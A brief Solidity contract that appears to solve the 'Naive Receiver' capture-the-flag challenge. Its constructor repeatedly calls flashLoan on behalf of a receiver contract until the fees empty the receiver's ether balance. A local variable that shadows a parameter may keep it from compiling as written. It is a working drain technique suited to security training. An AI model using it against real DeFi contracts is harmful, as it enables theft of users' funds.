// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract EmptyNaiveEther {
    constructor(address payable pool, address receiver) {
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(pool);

        while (address(receiver).balance > 0) {
            pool.flashLoan(receiver, 1);
        }
    }
}